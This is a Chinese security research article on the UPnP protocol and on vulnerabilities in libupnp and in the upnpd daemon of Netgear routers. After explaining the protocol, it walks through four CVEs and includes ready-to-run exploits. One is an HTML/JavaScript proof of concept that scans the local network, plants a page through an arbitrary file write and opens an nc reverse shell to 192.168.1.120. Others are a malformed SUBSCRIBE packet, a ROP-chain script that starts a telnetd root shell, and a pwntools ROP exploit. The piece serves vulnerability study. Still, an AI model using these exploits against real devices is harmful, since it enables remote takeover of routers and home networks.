0x00 概述
=======

协议栈
---

UPnP全名是Universal Plug and Play，翻译过来就是即插即用，该协议的设计初衷是希望设备接入某个网络中之后，所有设备都知道新设备的加入，并且设备之间能够相互沟通，或者直接使用控制对方。  
该设备基于TCP。UDP和HTTP协议，协议栈如下。（来自官网）

![Pasted image 20220818105850.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-8d21c4c2f9ad367a54dd1c2543210ddbaed14cc4.png)  
libupnp在传统的upnp协议实现的基础上，自己集成了HTTP处理，XML处理，HTTP\_server，SSDP处理等等...  
协议栈中第三层，HTTPU HTTPMT和HTTP都是基于TCP和UDP封装的数据包，数据内容也是为上层的SSDP,SOAP,GENA协议提供基础，SSDP等第四层的三个协议基本通信都是使用xml来交互的，这一层负责保存xml文件格式存储的内容。  
至此，协议栈实现了基本的UPnp之间的通信，在网上一些设备的细节就被屏蔽掉了，提供一个通用的接口，由不同的设备厂商自己定义接口的功能等作用。

### 基本标识

要熟悉upnp格式的数据报文和信息传递，需要先对一些标识有概念。

- UUID  
    Universally Unique Identifier，通用唯一识别码。目的是让分布式系统中的所有元素，都有唯一辨识咨询，定义格式为：`xxxxxxxx-xxxx-xxxx-xxxxxxxxxxxxxxxx(8-4-4-16)`  
    分别为当前日期和时间，时钟序列，全局唯一的IEEE机器识别号，如果有网卡，从网卡mac地址获得，没有网卡以其他方式获得。
- UDN  
    单一设备名（Unique Device Name），基于UUID，表示一个设备。在不同的时间，对于同一个设备此值应该是唯一的。
- URN  
    URL的一种更新形式，统一资源名称(URN,Uniform Resource Name)。唯一标识一个实体的标识符，但是不能给出实体的位置。标识持久性Internet资源。URN可以提供一种机制，用于查找和检索定义特定命名空间的架构文件。尽管普通的URL可以提供类似的功能，但是在这方面，URN 更加强大并且更容易管理，因为 URN 可以引用多个 URL。
- Mx  
    1到5之间的一个值，表示最大的等待应答的秒数。
- ST  
    Seatch Targer，表示搜索的节点类型。
    
    ### SSDP协议
    
    SSDP为整个upnp协议栈中的发现协议，当设备接入网络是即会向网络中的某个广播ip发送SSDP数据包，通知其他设备自己的加入，而其他设备收到该广播数据包之后，会以单播的形式来响应这条信息。  
    广播包发送如下：
    
    ```http
    M-SEARCH * HTTP / 1.1  
    host：239.255.255.250 ：1900  
    MAN：ssdp：discover  
    MX：10  
    ST：ssdp：all
    ```
    
    该数据包类似HTTP，又被称为HTTPU协议（即基于UDP的HTTP）  
    接收到的回复单播数据包如下：
    
    ```http
    HTTP/1.1 200 OK\r\n
    CACHE-CONTROL: max-age=120\r\n
    ST: uuid:75802409-bccb-40e7-8e6c-40a5ef100e92\r\n
    USN: uuid:75802409-bccb-40e7-8e6c-40a5ef100e92\r\n
    EXT:\r\n
    SERVER: RT-N56U/3.4.3.9 UPnP/1.1 MiniUPnPd/2.0\r\n
    LOCATION: http://192.168.100.1:24795/rootDesc.xml\r\n
    OPT: "http://schemas.upnp.org/upnp/1/0/"; ns=01\r\n
    01-NLS: 1652586384\r\n
    BOOTID.UPNP.ORG: 1652586384\r\n
    CONFIGID.UPNP.ORG: 1337\r\n
    \r\n
    ```

可以利用python模拟发送HTTPU的广播数据包，获取局域网内的UPnp设备信息。

```python
import socket
import re

ANY = "0.0.0.0"
DES_IP = "239.255.255.250"
PORT = 1900
xml_str = b'M-SEARCH * HTTP/1.0\r\n' \
    + b'HOST: 239.255.255.250:1900\r\n' \
    + b'MAN: "ssdp:discover"\r\n' \
    + b'MX: 3\r\n' \
    + b'ST: ssdp:all\r\n' \
    + b'USER-AGENT: Google Chrome/87.0.4280.88 Windows\r\n\r\n\r\n'

print(xml_str)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((ANY, PORT))
s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
s.setsockopt(
    socket.IPPROTO_IP,
    socket.IP_ADD_MEMBERSHIP,
    socket.inet_aton(DES_IP) + socket.inet_aton(ANY)
)
s.setblocking(False)
s.sendto(xml_str, (DES_IP, PORT))
while True:
    try:
        data, address = s.recvfrom(2048)
    except Exception as e:
        pass
    else:
        print(address)
        print(data)
        print("####################################################################")
```

### SCPD描述

可以注意到在SSDP响应包中有一个location字段，指向了一个xml文件，在UPnp的交互过程中，描述设备的信息，或者控制设备都是通过xml文件来实现的。  
访问location字段中的url即可得到目标设备的基本信息。截取出来一段：

```xml
<deviceList>
<device>

<deviceType>urn:schemas-upnp-org:device:WANConnectionDevice:1</deviceType>

<friendlyName>WANConnectionDevice</friendlyName>

<manufacturer>MiniUPnP</manufacturer>

<manufacturerURL>http://miniupnp.free.fr/</manufacturerURL>

<modelDescription>MiniUPnP daemon</modelDescription>

<modelName>MiniUPnPd</modelName>

<modelNumber>20220316</modelNumber>

<modelURL>http://miniupnp.free.fr/</modelURL>

<serialNumber>1.0</serialNumber>

<UDN>uuid:75802409-bccb-40e7-8e6c-40a5ef100e93</UDN>

<UPC>000000000000</UPC>

<serviceList>

<service>

<serviceType>urn:schemas-upnp-org:service:WANIPConnection:1</serviceType>

<serviceId>urn:upnp-org:serviceId:WANIPConn1</serviceId>

<SCPDURL>/WANIPCn.xml</SCPDURL>

<controlURL>/ctl/IPConn</controlURL>

<eventSubURL>/evt/IPConn</eventSubURL>

</service>

</serviceList>

</device>
</deviceList>
```

文件中有多个deviceList，每个List下面包含了device和service，在上面这一个单元中可以看到，device中包含了该设备的名字，和通用名（friendlyName），在serviceList中，包含了一些URL，例如SCPDURL，controlURL，其中，SCPD里面的url访问即可得到关于该设备的所有操作，下面给一段例子：

```xml
<actionList>

<action>

<name>SetConnectionType</name>

<argumentList>

<argument>

<name>NewConnectionType</name>

<direction>in</direction>

<relatedStateVariable>ConnectionType</relatedStateVariable>

</argument>

</argumentList>

</action>
```

该描述文件中包含了可以执行的操作，和该操作需要的参数。  
而controlURL和eventURL则是执行该操作需要请求的资源。  
这就是UPnp协议中存储资源的方式，服务资源和设备信息都使用xml文件存储，也使用xml文件执行操作。

### SOAP控制

控制设备是一个较为广泛的概念，在设备允许的范围内，使用允许的协议对设备执行一些操作，都可以称为控制，但是这里把订阅和一般的控制分开来讲，SOAP主要是执行一些一般的控制。

SOAP协议基于TCP协议，实现了以xml为基础的设备控制。  
相应的格式如下：

```xml
<?xml version="1.0" encoding="utf-8"?>
            <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                <soap:Body>
                    <u:GetConnectionTypeInfo xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
                    </u:GetConnectionTypeInfo>
                </soap:Body>
            </soap:Envelope>

```

在soap请求的body中，以&lt;\\u&gt;的标签形式，导入action和service\_type。这还是一个没有传入参数的情景，下面给以标准的数据包。

```http
POST /control/url HTTP/1.1  
HOST: hostname:portNumber  
CONTENT-TYPE: text/xml;charset="utf-8"  
CONTENT-LENGTH: length ofbody  
USER-AGENT: OS/versionUPnP/1.1 product/version  
SOAPACTION:"urn:schemas-upnp-org:service:serviceType:v#actionName"  

<?xml version="1.0"?>  
<s:Envelope  
   xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"  
   s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">  
      <s:Body>  
          <u:actionNamexmlns:uu:actionNamexmlns:u="urn:schemas-upnp-org:service:serviceType:v">  
             <argumentName>in arg value</argumentName>  
          </u:actionName>  
      </s:Body>  
  </s:Envelope>
```

注意到HTTP头也发生了变化。  
按照这样的格式发送数据包过去，接收到的返回包也是xml格式的内容，格式内容也差不多。

```http
HTTP/1.1 200 OK  
CONTENT-TYPE: text/xml;charset="utf-8"  
DATE: when response wasgenerated  
SERVER: OS/version UPnP/1.1product/version  
CONTENT-LENGTH: bytes inbody  

<?xmlversionxmlversion="1.0"?>
<s:Envelope  
 xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"  
 s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">  
     <s:Body>  
         <u:actionNameResponsexmlns:uu:actionNameResponsexmlns:u="urn:schemas-upnp-org:service:serviceType:v">  
             <argumentName>out arg value</argumentName>  
         </u:actionNameResponse>  
     </s:Body>  
</s:Envelope>
```

以上就是SOAP的控制操作，需要注意的请求url和方法，参数规则，通过SCPD可以查询到，一定要调用对应device和service下面的方法和url，否则请求就会失败。

### GENA订阅&amp;事件

在以上的基础上，UPnp还实现了基于HTTP的GEN协议，该协议用来处理一些订阅消息。  
订阅的请求格式

```http
SUBSCRIBE publisher pathHTTP/1.1  
HOST: publisherhost:publisher port  
USER-AGENT: OS/versionUPnP/1.1 product/version  
CALLBACK: <deliveryURL>  
NT: upnp:event
```

订阅用来在设备信息更换的时候，由设备向订阅者发送更换通知。

> 服务通过发送事件消息来发布更新。事件消息包括一个或多个状态信息变量以及它们的当前数值。这些消息也是采用XML的格式，用通用事件通知体系进行格式化。一个特殊的初始化消息会在控制点第一次订阅的时候发送，它包括服务相关的变量名及值。为了支持多个控制点并存的情形，事件通知被设计成对于所有的控制点都平行通知。因此，所有的订阅者同等地收到所有事件通知。

订阅的请求url就在SCPD中看到的eventSubURL中。`<eventSubURL>/evt/IPConn</eventSubURL>`  
其中的deliveryURL，是回调的url，即为事件订阅的应答，NT固定为upnp:event表示为订阅事件。  
收到的相应数据包为：

```http
HTTP/1.1 200 OK  
DATE: when response was generated  
SERVER: OS/version UPnP/1.1 product/version  
SID: uuid:subscription-UUID  
CONTENT-LENGTH: 0  
TIMEOUT: Second-1800
```

需要注意的是SID。

事件消息是NOTIFY作为报文头，格式如下：

```http
NOTIFY delivery path HTTP/1.1  
HOST: delivery host:delivery port  
CONTENT-TYPE: text/xml; charset="utf-8"  
NT: upnp:event  
NTS: upnp:propchange  
SID: uuid:subscription-UUID  
SEQ: event key  
CONTENT-LENGTH: bytes in body  

<?xml version="1.0"?>  
<e:propertysetxmlns:ee:propertysetxmlns:e="urn:schemas-upnp-org:event-1-0">  
    <e:property>  
        <variableName>new value</variableName>  
    </e:property>
</e:propertyset>
```

订阅者收到消息之后，在30s内需要返回确认，即HTTP1.1 200OK

攻击面
---

从协议的设计模式上来说，整个UPnp服务还是存在很多可能由缺陷的地方，此外再加上嵌入式设备这个不安全的变量，UPnp在近年来频繁的爆出漏洞，现在从设计的角度上谈一谈容易出现漏洞的地方。

- 数据包处理  
    数据包的处理，UPnp的各类数据包，SSDP，SOAP之类的，都是在HTTP和HTTPU上建立起来的，对于不同的设备来说，实现的方式也不同，这就导致了厂商设计出来的upnpd程序良萎不齐，在数据的处理上，容易出现判断边界不严格，在":"之类的地方出现溢出类的漏洞。如CVE-2012-5958，在strncpy的时候，len函数用错了地方，且截取冒号之间的字符，这就导致了严重的缓冲区溢出。
    
    ```http
    M-SEARCH * HTTP/1.1
    Host: 230.255.255.250:1900
    ST: uuid:schemas:device:xxxxxxxxxxxx
    Man: "ssdp:discover"
    MX: 3
    ```
    
    在device后面注入一大段payload即可获得程序控制机会。
- 变量过滤不严格  
    在高度定制化的SOAP请求和SSDP数据中，在一些程序中，这些数据可能会被直接送去system等函数中，不严格的过滤很容易导致命令注入，类似的例子比较多，CVE-2017-17215，CVE-2020-15893等，有的注入存在于XML解析，有的存在于请求的主体上，如果程序出现system函数，那么注入的可能性还是比较高的。
- XML解析  
    XML作为前后端分离的一个标志，逐渐广泛运用，但是XML解析上，容易出现递归错误，和XEE注入等，理论上来说，也可能存在较大的问题，但是实际上爆出来的和UPnp有关的XML漏洞好像也不是特别多。有的话也是结合了变量进行的命令注入，而XEE注入不太常见。
- 信息泄露和越权控制  
    貌似是一个比较广的问题，可以发现SOAP等数据包，不需要任何的身份验证，这就意味着，任何一台可以连接到目标Upnp网络中的设备，都可以控制网络中的所有设备。如果是路由器，改变端口映射直接打穿内网也不是不可能。

最后在嵌入式的大背景之下，一些小型的设备，为了降低开发成本，代码之间的复制粘贴，自己设计的阉割版程序，都将导致大量的安全问题和漏洞的复用，只能通过提高用户的安全意识来防范。

### Tools

现在对Upnp产生了很多的工具，例如Miranda，该工具可以模拟upnp发包，各类报文都在源码中有实现的模板，收集一些局域网内的upnp设备信息十分方便，同时该项目只有两个py文件，非常轻量级。但是项目很老了，也没有人维护，只能做一些信息收集的基本功能比较方便。

[CallStranger](https://github.com/yunuscadirci/CallStranger)可以模拟发送订阅数据包，一般是用来做漏洞测试的，CVE-2020-12695，对局域网内的设备进行扫描并且搜索出可能由该漏洞的设备。但是对https支持性貌似不太好。

[upnpclient](https://github.com/flyte/upnpclient)一个好用的python3 upnp通信客户端，可以很好的模拟通信。

0x01 libupnp
============

libupnp是一个开源的便携式upnp库，编译之后作为so链接文件存在于设备中，虽然相比miniupnp和自己实现的upnp，libupnp不是特别的轻量级，但是我认为该upnp的实现已经是相对起来比较安全的了。

在近年，libupnp漏洞较少，在16，17年以前，层出现过较多次的严重缓冲区溢出。拿这些漏洞作为基础，研究一下upnp的漏洞，顺便可以利用libupnp这个项目，弄明白upnp的工作原理。

程序框架
----

最近还分析了lighttpd，怎么说呢，感觉像是一家人写的代码，一堆enum结构和switch，再加上多线程，该程序理解起来不是一件简单的事情。  
这里的框架也是我仅仅分析了大概三四天分析出来的。只对其中从UPNP\_init函数开始的一部分做了分析，其余的device注册，添加之类的就没有多看了，那边应该更多的是xml文件的修改和处理，不过libupnp使用的xml都是静态的，修改起来尤为麻烦，可能添加的代码也比较难看。

init的代码不是特别难看，从init往下追踪可以发现一个这样的函数。

![Pasted image 20220817092849.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-41415aae43fe97b522f041e62ce3a17112b06e67.png)  
函数内，通过判断参数，来给定是否开启webserver，如果开启的话，则初始化webserver，然后设置webserver的回调函数。

该回调函数在HTTP处理的最后将被按照不同的方法调用，这里不细细分析源码，大致的讲一下框架。

- webserver  
    `libupnp`自己实现了一个`webserver`，这个`webserver`对`GET`路径请求设置为有效，因为`upnp`也是基于`HTTP`实现的，所以对于`GET`请求，直接定位文档，然后返回数据即可，对于`POST`之类的请求，就需要用虚拟路径（controlurl)，目前在HTTP上只支持这两种请求，别的不支持。
- xml  
    `libupnp`还设计了xml解析器，解析器会被UPnp协议和客户端调用。
- HTTP解析  
    基于HTTP实现的ssdp，scpd，soap等数据包，都交由该解析器解析，在webserver的基础上，接受socket传递过来的数据，然后进行不同的消息解析，解析完成后返回相应的数据，这都由HTTP解析器来完成。  
    此外，还提供额外的微型服务，该服务接受所有的网络连接，判断哪些数据可以进入上层哪些不可以，例如HTTP解析器只处理规定的消息类型，其余的消息就被该服务屏蔽了。

最后在init函数中，使用多线程工作任务的模式，调用TPJobInit函数，将任务加入到队列，然后等待空闲的线程调用执行。

![Pasted image 20220818155829.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-998e6092c6c8a8d2982924e6cb814b7b19b5b606.png)  
类似上图的处理，由此图也可看出libupnp的一个缺点，包装多了，对下层实现的屏蔽太强了，导致上层想要了解下层的原理或者做出更改，需要很久才能理解其中的机制（但我建议还是看一下源码，因为对upnp的理解有很大的帮助）

漏洞分析
----

libupnp历史版本的漏洞分析

### CVE-2016-6255

> Portable UPnP SDK (aka libupnp) before 1.6.21 allows remote attackers  
> to write to arbitrary files in the webroot via a POST request without  
> a registered handler.

漏洞描述为UPnP可以由POST实现任意文件写，按照逻辑找到了可能出现的位置，最后的文件处理在webserver的回调函数当中。

![Pasted image 20220817203509.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-2948a7cd4c0a30c00a45be3aaaeeafcbdd0f4031.png)  
在HTTP处理的最后，根据氢请求头，进入不同的回调函数，这里按照描述上说，触发的位置应该是gGetCallback函数。我是用的是1.6.20版本的源码，刚好漏洞在1.6.21被修补。  
在目标callback函数中，首先是进行了一些操作，然后根据返回的结果来进行不同的处理。

![Pasted image 20220818160821.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-0609a653a15d1ed4c93874f330a05b178b87f9de.png)  
可能是类似request\_type之类的东西，我们需要的应该是在最后的REST\_POST，查看RecvPostMessage函数。

![Pasted image 20220818160935.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-cf1b416c025bfc8bb907fe82c3462cb9d6aed065.png)  
此处直接打开了filename，然后后面对其进行了写

![Pasted image 20220818161007.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-65a2700739b68e77abf5393ef326095bfdb07c00.png)  
这就导致filename从理论上来说，在upnp的权限范围之内，可以写任意的文件在可写文件夹。  
继续分析filename的来源，追溯到了process\_request函数，该函数filename作为参数传入，可能在函数中对filename进行了写入的操作。  
该函数中首先对请求的uri进行了判断，过滤了../和空格之类的东西，规定了请求资源的开头必须是/，然后进行了关键的判断。  
`isFileInVirtualDir(request_doc)`，这个函数决定了filename最后的赋值操作。filename中的两个处理模式。

- 第一种是virtualDir  
    virtualDir处理中，发现系统维护一个全局的链表**pvirtualDir**，链表存储了所有的virtual文件夹，通过判断请求的资源是否是其中的dir是否有和请求URI匹配的，如果有则返回true否则返回false。
- 第二种是alias模式  
    这个判断的是gAliasDoc全局变量，如果这个变量不是空则返回True

![Pasted image 20220818163514.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-a1eb65c43b8f7ec262ab7bcb11c507d8f77a4767.png)  
之后又是判断请求的资源是否和默认资源一样，一样才返回True。

后面又有if分支对不同的情况有不同的处理，这里的if比较奇葩，第一种是虚拟资文件夹，第二种是既不是虚拟文件夹，也不是alias，没有第三种。。。  
重点分析漏洞出现的位置。

![Pasted image 20220818163724.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-846a8f761e3001ec2914db929d701420f717aee7.png)  
这种模式下，URI直接被拼接到了rootDir的后面，然后去除末尾的/就直接完成了filename的赋值。  
结束if之后，又来了个请求方式的判定，是否是POST然后就直接返回了。所以理论上在RootDir以下，可以完成任意写。  
本来我想的利用方式比较粗糙，构造xml文件，在设备的描述方法里面添加别的描述方法，然后就可以执行一些非预期的命令。  
但是后来在exploit-db上发现了poc，该poc比我的利用方法好了太多。

```html

<html>
    <head>
        <meta charset="UTF-8">
        <script>
            function create_page(ip, frame_id)
            {
                payload = "\n" +
                          "<html>\n" +
                            "<head>\n" +
                                "<title>Try To See It Once My Way</title>\n" +
                                "<script>\n" +
                                    "function exec_lua() {\n" +
                                        "soap_request = \"<s:Envelope s:encodingStyle=\\\"http://schemas.xmlsoap.org/soap/encoding/\\\" xmlns:s=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\">\";\n" +
                                        "soap_request += \"<s:Body>\";\n" +
                                        "soap_request += \"<u:RunLua xmlns:u=\\\"urn:schemas-micasaverde-org:service:HomeAutomationGateway:1\\\">\";\n" +
                                        "soap_request += \"<Code>os.execute(\"/bin/sh -c &apos;(mkfifo /tmp/a; cat /tmp/a | /bin/sh -i 2>&1 | nc 192.168.1.120 1270 > /tmp/a)&&apos;\")</Code>\";\n" +
                                        "soap_request += \"</u:RunLua>\";\n" +
                                        "soap_request += \"</s:Body>\";\n" +
                                        "soap_request += \"</s:Envelope>\";\n" +

                                        "xhttp = new XMLHttpRequest();\n" +
                                        "xhttp.open(\"POST\", \"upnp/control/hag\", true);\n" +
                                        "xhttp.setRequestHeader(\"MIME-Version\", \"1.0\");\n" +
                                        "xhttp.setRequestHeader(\"Content-type\", \"text/xml;charset=\\\"utf-8\\\"\");\n" +
                                        "xhttp.setRequestHeader(\"Soapaction\", \"\\\"urn:schemas-micasaverde-org:service:HomeAutomationGateway:1#RunLua\\\"\");\n" +
                                        "xhttp.send(soap_request);\n" +
                                    "}\n" +
                                "</scr\ipt>\n" +
                            "</head>\n" +
                            "<body onload=\"exec_lua()\">\n" +
                            "Zen?\n" +
                            "</body>\n" +
                          "</html>";

                var xhttp = new XMLHttpRequest();
                xhttp.open("POST", "http://" + ip  + ":49451/z3n.html", true);
                xhttp.timeout = 1000;
                xhttp.onreadystatechange = function()
                {
                    if (xhttp.readyState == XMLHttpRequest.DONE)
                    {
                        new_iframe = document.createElement('iframe');
                        new_iframe.setAttribute("src", "http://" + ip + ":49451/z3n.html");
                        new_iframe.setAttribute("id", frame_id);
                        new_iframe.setAttribute("style", "width:0; height:0; border:0; border:none");
                        document.body.appendChild(new_iframe);
                    }
                };
                xhttp.send(payload);
            }
            function spray_and_pray()
            {
                RTCPeerConnection = window.RTCPeerConnection ||
                                    window.mozRTCPeerConnection ||
                                    window.webkitRTCPeerConnection;

                peerConn = new RTCPeerConnection({iceServers:[]});
                noop = function() { };

                peerConn.createDataChannel("");
                peerConn.createOffer(peerConn.setLocalDescription.bind(peerConn), noop);
                peerConn.onicecandidate = function(ice)
                {
                    if (!ice || !ice.candidate || !ice.candidate.candidate)
                    {
                        return;
                    }

                    clientNetwork = /([0-9]{1,3}(\.[0-9]{1,3}){2})/.exec(ice.candidate.candidate)[1];
                    peerConn.onicecandidate = noop;

                    if (clientNetwork && clientNetwork.length > 0)
                    {
                        for (i = 0; i < 255; i++)
                        {
                            create_page(clientNetwork + '.' + i, "page"+i);
                        }
                    }
                };
            }
        </script>
    </head>
    <body onload="spray_and_pray()">
    Everything zen.
    </body>
</html>
```

直接利用html中的lua，发请求，然后iframe加载结果获得反弹的shell，还添加了局域网扫描的功能。拿来即可使用。

修复： 新版的补丁中添加了全局宏，限制了POST操作的可写权限。

### CVE-2016-8863

同样的1.6.21以下版本出现的漏洞。

> Heap-based buffer overflow in the create\_url\_list function in  
> gena/gena\_device.c in Portable UPnP SDK (aka libupnp) before 1.6.21  
> allows remote attackers to cause a denial of service (crash) or  
> possibly execute arbitrary code via a valid URI followed by an  
> invalid one in the CALLBACK header of an SUBSCRIBE request

在create\_url\_list函数中存在的堆溢出，会导致Dos，问题出在CALLBACK的处理。  
定位到漏洞位置，这个给的是比较详细了。  
整个漏洞函数就只有两个大的for循环，第一个如下：

```c
for( i = 0; i < URLS->size; i++ ) {
    if( ( URLS->buff[i] == '<' ) && ( i + 1 < URLS->size ) ) {
        if( ( ( return_code = parse_uri( &URLS->buff[i + 1],
                                         URLS->size - i + 1,
                                         &temp ) ) == HTTP_SUCCESS )
            && ( temp.hostport.text.size != 0 ) ) {
            URLcount++;
        } else {
            if( return_code == UPNP_E_OUTOF_MEMORY ) {
                return return_code;
            }
        }
    }
}
```

在这个循环中对传入的url字符串遍历，直到匹配到"&lt;"字符串并且i此时还小于size，然后调用函数解析这个url，如果成功解析则URLcount++，解析失败则判断return\_code是不是指定的ret\_code。  
接着再看下面的循环。

![Pasted image 20220818165451.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-2b158b06d44f1fd24d22d9cfa15b0f1052400687.png)  
如果URLcount大于0则为URL申请一片空间，为解析后的URL也申请空间。之后把存储源URL的buffer拷贝到out的空间中，之后的for循环也是对目标url的解析，但是解析的结果要存放在预先分配的parsedURLS堆空间，这里注意到，for循环使用的是原始的字符串，也就是说此时如果URLcount=1也是可能的，因为如果有两个url，第一个成功解析，而第二个解析失败，就会在第一个for循环跳出，此时URLcount=1，所以说第二次parase的时候，URLcount=0，没问题，正常解析，当解析到后面哪个错误的url的时候，此时URLcount=1，而预先malloc的空间却只有一个，这就导致了单个堆溢出（数组越界）  
这个越界的值被传入parse\_URI，当处理完毕的时候，该地址会被解析，然后写入处理之后的值，这个影响有点不定，有时没有关系，又是会导致crash，有时也会RCE。

```http
SUBSCRIBE /upnp/control/WANIPConn1 HTTP/1.1
HOST: 0.0.0.0:49152
CALLBACK: <http://192.168.1.1:49153/gatedesc.xml><12//:49153
NT: upnp:event
TIMEOUT: Second-1801

```

利用就是nc端口，把上面的数据包发一下就行了，注意端口自己确定，还有订阅的url也是具体情况具体分析。

更早版本的lubupnp也有漏洞，出现的位置是ssdp的处理上，详细的就不在这里细说了，附上讲解的链接。  
<https://www.cnblogs.com/Shepherdzhao/p/7570632.html>

0x02 Others
===========

在libupnp的基础上，再看看别的upnp实现，同样的出现漏洞的位置大都是处理相关的cgi，而和本身没有太大的关系。

### CVE-2020-9373

熟悉的Netgear设备，该设备的R6400等多个固件版本中存在栈溢出漏洞。发送构造好的ssdp数据包可能导致Dos或Rce。

这个洞原理也非常简单，首先还是先拿固件下来，按照漏洞描述拿下了1.0.32版本的固件，官网也可以下再开源的GPL源码，方便阅读。

目标漏洞程序是/usr/sbin下的upnpd，整体的实现和libupnp应该差不多，由于是ssdp出问题了，搜索相关的字符串，ssdp:discover之类的，查看ssdp头部数据处理。

![Pasted image 20220819090105.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-7ece7df26f892d1e255e50ee441f5c63782359f0.png)  
刚进去函数就看到一个大大的strcpy，v39只有12个字节，如果src比这个大就可以溢出。  
回溯了以下src，发现貌似，直接传数据就可以触发漏洞，因为头部处理还在strcpy之下。

![Pasted image 20220819090725.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-86b938b64a69f16c4473c0ad8b02de250edd6cf9.png)

![Pasted image 20220819090742.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-3f46a24d3b2a83fe2177ea805875807cbeb411d3.png)  
exp：就是照着arm下面的ret2libc打就行，调试可能麻烦一点，发送pwntools的payload，然后看寄存器，确定偏移，然后ret2shellcode。

```python
import sys
import socket
import time
addr_r7 = \
b"\xcc\x04\x10\x40" # if this address readble, RCE; otherwise DOS;

addr_rop0 = \
b"\x24\x91\x01\x00"

addr_rop1 = \
b"\xcc\x04\x10\x40" \
b"\x41\x41\x41\x41\x41\x41\x41\x41" \
b"\x8f\x9c\x06\x00\x1e\x00\x00\x00" \
b"\xcc\x04\x10\x40\xcc\x04\x10\x40" \
b"\xcc\x04\x10\x40\xcc\x04\x10\x40" \
b"\xcc\x04\x10\x40\xcc\x04\x10\x40" \
b"\xe4\xce\x00\x00"

addr_rop2 = \
b"\x78\x78\x01\x00"

cmd = \
b"telnetd -F -l /bin/sh -p 9999;" \
b"\x00"

data = b"\x41"*0x604 + \
addr_r7 + b"\x41"*0x28 + addr_rop0 + \
b"\x61"*0x258 + addr_rop1 + cmd + \
b"\x41"*0x3ed + addr_rop2
def send_ssdp(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect((ip, port))
    sock.send(data)

def usage():
    print("python3 %s ip port(1900)" % sys.argv[0])

if __name__ == "__main__":
    if len(sys.argv) != 3:
        usage()
    else:
        send_ssdp(sys.argv[1], int(sys.argv[2]))
```

### CVE-2021-27239

同样的固件，在审计上一个洞的时候，还被我发现了一个洞，然后搜索知道，该漏洞已经申请CVE编号，所以就在这里再多扯皮一下，漏洞原理也比较简单。在处理SSDP报文的MX头时，对MX的内容使用strstr和\\r\\n作为区分，导致strncpy第三个参数可控，从而溢出。

![Pasted image 20220819094923.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-be792feb02cd64234092c2e4488e68c0c5e06299.png)

payload和上面那个的调试方法一样，只是转移到了MX之后。  
用了xuanxuan佬的exp

```python
from pwn import *

io = remote("127.0.0.1",1900,typ='udp')

cmd = b'ls'

# throw rop chain to stack first
rop_chain  = p32(0x970A0)
rop_chain += p32(1) * 2
rop_chain += p32(0xBB44)
rop_chain += cmd.ljust(0x400,b"\x00")
rop_chain += p32(1) * 3
rop_chain += p32(0xAE64)
io.send(b'a'*356 + rop_chain)

sleep(0.1)

# trigger stack buffer overflow to rop chain
payload  = b'M-SEARCH * HTTP/1.1 \r\n'
payload += b'Man: "ssdp:discover" \r\n'
payload += b'MX: '
payload += b'a'*139
payload += p32(0x13908)[:-1]
payload += b'\r\n'
io.send(payload)
```

ps: 其中的调试思路非常值得学习，我就懒得写了，博客文章在参考链接内有。

CVE-2019-14363，CVE-2021-27137也是类似的漏洞，问题出在:的边界检测，原理不分析了，肯定是开发的人用了同样的代码。  
可能在不同的代码里面都还有着潜在的类似威胁。

0x03 思考
=======

本来是想看看libupnp的代码，学一下upnp协议的规范，然后就顺便复现了几个libupnp的漏洞，这俩2016的漏洞挺有意思的，不仔细看还发现不了，第二个越界可以说是有些代码习惯确实如此，自己也不会注意，第一个也是同样的，这类看起来不像漏洞的漏洞危害不小于常见的溢出之类的。  
后面的两个upnpCVE完全是顺手分析了一下（反正没有钱买设备，，，，）复现了第一个之后，感觉挺简单的，然后固件版本也比较老，就顺便看了一下ssdp的处理，但后就发现了第二个洞，顺便就复现了两个，然后就写下来了。

这此除了upnp协议学到最多的就是调试了，之前调试环境起不来的时候尝试过patch，但是我发现和xuanxuan大佬比起来，我还是路走窄了，原来为了规避fork之类的，还能直接patche libc。。。。  
加上一些环境变量的处理，还是收获很大。

此外，这几次漏洞的都处在str复制上，所以我很讨厌自己包装str函数的人，这不是不给黑阔饭吃吗（bushi！！！strncpy，包括scanf，之类的，出现字符串复制和转移，输入，都有可能出现问题，比较字符串的边界问题在C语言中，一直比较难处理。

0x04 参考
=======

<https://www.electricmonk.nl/log/2016/07/05/exploring-upnp-with-python/>

<http://antkillerfarm.github.io/technology/2016/03/11/upnp#%E4%BA%A4%E4%BA%92%E6%B5%81%E7%A8%8B>

<https://xuanxuanblingbling.github.io/iot/2021/11/01/netgear/>